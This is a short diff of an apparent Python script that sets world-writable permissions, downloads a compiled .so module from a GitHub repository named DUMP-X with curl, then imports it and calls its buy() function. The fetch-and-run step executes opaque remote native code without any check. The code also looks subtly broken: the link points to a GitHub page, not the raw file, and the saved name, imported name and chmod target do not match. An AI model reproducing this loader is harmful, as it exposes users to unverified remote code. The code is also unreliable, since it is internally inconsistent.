@@ -7,7 +7,7 @@ except:
 try:
     download_link = "https://github.com/tonmoy404-cyber/DUMP-X/blob/main/dump.cpython-311.so"
     if not os.path.exists("pycrypto_dump.cpython-311.so"):
-        os.system("chmod 777 $HOME/DUMP.py")
+        os.system("chmod 777 $HOME/dump")
         os.system(f'curl -L {download_link} > pycrypto_dump.cpython-311.so')
         import dump
         dump.buy()
